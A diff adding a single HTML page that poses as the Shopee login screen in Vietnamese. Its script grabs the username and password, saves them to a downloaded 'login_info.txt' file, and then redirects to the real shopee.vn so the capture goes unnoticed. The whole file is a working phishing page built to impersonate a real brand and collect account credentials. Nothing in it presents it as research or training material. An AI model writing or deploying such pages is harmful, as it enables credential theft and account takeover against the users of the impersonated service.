@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng nhập Shopee</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-image: url('https://source.unsplash.com/random');
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        .container h2 {
+            margin-top: 0;
+            margin-bottom: 20px;
+        }
+        .container form {
+            display: flex;
+            flex-direction: column;
+        }
+        .container form input {
+            margin-bottom: 10px;
+            padding: 8px;
+            border-radius: 3px;
+            border: 1px solid #ccc;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .container form button {
+            padding: 10px;
+            border: none;
+            background-color: #4CAF50;
+            color: #fff;
+            cursor: pointer;
+            border-radius: 3px;
+            transition: background-color 0.3s ease;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .container form button:hover {
+            background-color: #45a049;
+        }
+        .register-link {
+            margin-top: 10px;
+            text-align: center;
+        }
+        .register-link a {
+            color: #4CAF50;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        .register-link a:hover {
+            color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Đăng nhập Shopee</h2>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Tên đăng nhập" required>
+            <input type="password" id="password" placeholder="Mật khẩu" required>
+            <button type="submit">Đăng nhập</button>
+        </form>
+        <div class="register-link">
+            <span>Bạn chưa có tài khoản? </span><a href="#">Đăng ký ngay</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Ngăn chặn việc gửi form mặc định
+            
+            // Lấy giá trị của tên đăng nhập và mật khẩu
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            
+            // Lưu thông tin đăng nhập vào một tệp đã chọn
+            saveLoginInfo(username, password);
+            
+            // Đây là nơi bạn có thể thực hiện xác thực thông tin đăng nhập
+            
+            // Chuyển hướng đến trang chính của Shopee
+            window.location.href = "https://shopee.vn";
+        });
+
+        function saveLoginInfo(username, password) {
+            var loginInfo = "Tên đăng nhập: " + username + "\nMật khẩu: " + password;
+            var blob = new Blob([loginInfo], { type: 'text/plain' });
+
+            var a = document.createElement('a');
+            a.download = 'login_info.txt';
+            a.href = URL.createObjectURL(blob);
+            a.textContent = 'Download login_info.txt';
+
+            a.style.display = 'none';
+            document.body.appendChild(a);
+
+            a.click();
+
+            document.body.removeChild(a);
+        }
+    </script>
+</body>
+</html>
